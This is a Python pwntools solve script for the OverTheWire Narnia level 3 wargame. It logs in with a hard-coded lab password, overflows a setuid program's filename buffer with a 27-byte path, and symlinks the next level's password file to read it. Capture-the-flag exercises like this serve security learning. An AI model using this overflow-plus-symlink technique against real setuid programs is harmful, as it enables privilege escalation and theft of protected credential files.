#This one was frustrating because i forgot to put /narnia4 when linking the files and i wasted a whole day
#Will mmake it more neat later


from pwn import *
import time
import subprocess

#i like the debug context whenever i use pwntools
context.log_level='debug'
# these are all pretty self explanatory
level=3
user='narnia' + str(level)
host='narnia.labs.overthewire.org'
password='vaequeezee'
port=2226

#filename=str(raw_input("Please name your file :"))
filename="oreocookie"
print ("The file is going to be named " + filename)
#oflow=(cyclic(27))
oflow="b"*27
filepath="/tmp/" + oflow + "/tmp/" + filename
exe="/narnia/./narnia3 "

#/narnia/narnia3 /tmp/bbbbbbbbbbbbbbbbbbbbbbbbbbb/tmp/oreocookie

def conn():
    #basically just sshs into the level
    return ssh(user=user, host=host, password=password, port=port)
#def getPass(shell):
#    #this function prints the password
#    print('The password for the next level is...')
#    shell.sendline('cat /etc/narnia*/narnia' + str(level+1))
#    flag=shell.recvuntil('$').split()[0]
#def readCode(shell):
#    #this function downloads the narnialevel.c file and displays it, and at the end removes the .c
#    #file
#    code=shell.download_data('/narnia/' + user + '.c')
#    shell.download_file('/narnia/' + user + '.c')
#    log.info('The code for this level is')
#    print(code)
#    subprocess.call(['rm',user+'.c'])
#
tmp='"/tmp/" + '
p="$(python -c 'print "+ tmp +'"b"' +"*27 "    
p+='+ "/tmp/'
p+=filename + '"' + "')"  
print(p)
print(filepath)

payloadx="rm /tmp/" + filename
payloady="rm -r /tmp/" + oflow
payload0="touch /tmp/" + filename 
payload1="chmod 777 /tmp/" + filename 
payload2="mkdir /tmp/" + oflow 
payload3="cd /tmp/" + oflow 
payload4="mkdir tmp"
payload5="cd tmp/"
payload6="ln -s /etc/narnia_pass/narnia4 ./" + filename 
payload7=exe + filepath 
payload8="cat /tmp/" +filename
payload9=payload0 + "; "+payload1 +"; " +payload6 +"; " + payload7 
##This are the commands used for completing the level
#
##touch /tmp/oreocookie
##chmod 777 /tmp/oreocookie
##cd ./$(python -c'print "b"*27')
##mkdir /tmp/
##cd /tmp/
##ln -s /etc/narnia_pass/narnia4 ./oreocookie
##/narnia/narnia3 $(python -c'print "/tmp/" + "b"*27 + "/tmp/oreocookie"')
##cat /tmp/oreocookie
#
#
print(payloadx)
print(payloady)
print(payload2) #the payload is sent
print(payload3) #the payload is sent
print(payload4) #the payload is sent
print(payload5) #the payload is sent
print(payload0) #the payload is sent
print(payload1) #the payload is sent
print(payload6) #the payload is sent
print(payload7) #the payload is sent
print(payload9)
print(payload8) #the payload is sent
##print(payload9)
sh=conn()
#readCode(sh)
io=sh.shell("bash") 
#
io.sendline(payloadx)
io.sendline(payloady)
io.sendline(payload2) #the payload is sent
io.sendline(payload3) #the payload is sent
io.sendline(payload4) #the payload is sent
io.sendline(payload5) #the payload is sent
io.sendline(payload9)
io.sendline(payload8) #the payload is sent
#
##flag=getPass(io) #the password is found
#
io.interactive() #puts it into interactive mode so you can play around
